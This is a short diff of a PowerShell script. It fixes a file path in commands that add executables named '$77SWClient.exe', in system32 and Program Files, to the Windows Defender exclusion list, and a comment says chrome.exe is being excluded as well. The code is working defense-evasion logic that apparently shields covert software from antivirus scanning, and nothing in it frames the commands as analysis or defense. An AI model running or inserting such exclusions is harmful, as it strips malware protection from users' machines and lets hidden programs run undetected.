@@ -84,7 +84,7 @@ $exePath = 'C:\Windows\system32\$77Starware\$77SWClient.exe'
 # Use the Add-MpPreference cmdlet to add the executable to the exclusion list
 Add-MpPreference -ExclusionPath $exePath
 
-$exePath = 'C:\Program Files(x86)\$77Starware\$77SWClient.exe'
+$exePath = 'C:\Program Files (x86)\$77Starware\$77SWClient.exe'
 Add-MpPreference -ExclusionPath $exePath
 
 # Adds `chrome.exe' to the Windows Defender exclusion list
